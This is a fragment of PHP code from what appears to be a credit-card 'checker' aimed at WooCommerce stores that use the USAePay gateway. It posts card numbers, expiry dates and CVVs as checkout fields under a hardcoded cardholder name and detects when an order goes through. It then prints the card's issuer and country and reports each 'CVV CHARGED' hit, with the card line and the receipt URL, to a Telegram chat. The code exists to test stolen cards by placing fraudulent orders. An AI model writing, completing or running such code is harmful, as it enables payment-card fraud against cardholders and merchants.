...
$paymentMethods = [
    ...
    'usaepay' => '/<input[^>]*name="payment_method"[^>]*value="usaepay"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
 ...
 //   'wc-usa-epay-credit-card-context' => 'shortcode',
   // 'usaepay-card-number' => $cc,
   // 'usaepay-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
 //  'wc-first-data-clover-credit-card-exp-year' => $mes_with_zero . ' / ' . $ano_no_20,
    'usaepay_cardholdername' =>  'Sen Sui',
    'usaepay_ccnum' => $cc,
    'usaepay_expmonth' => $mes_with_zero,
    'usaepay_expyear' => $ano_no_20,
 //  'wc-first-data-clover-credit-card-exp-year' => $mes_with_zero . ' / ' . $ano_no_20,
    'usaepay_cvv' =>  $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED USAEPAY]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

    } elseif (strpos($msg, 'We were unable to process your order, please try again.') !== false) {
